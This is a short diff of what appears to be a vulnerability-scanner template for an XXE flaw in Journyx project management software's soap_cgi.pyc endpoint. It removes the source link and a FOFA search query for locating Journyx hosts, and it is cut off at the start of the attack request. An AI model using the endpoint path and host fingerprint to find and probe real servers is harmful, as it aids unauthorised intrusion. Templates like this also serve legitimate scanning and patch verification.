@@ -3,12 +3,8 @@ info:
   name: Journyx项目管理软件 soap_cgi.pyc XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wzcqgat76l4u37pt'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wzcqgat76l4u37pt
-    fofa: body="Journyx"
 http:
 - raw:
   - 'POST /jtcgi/soap_cgi.pyc HTTP/1.1
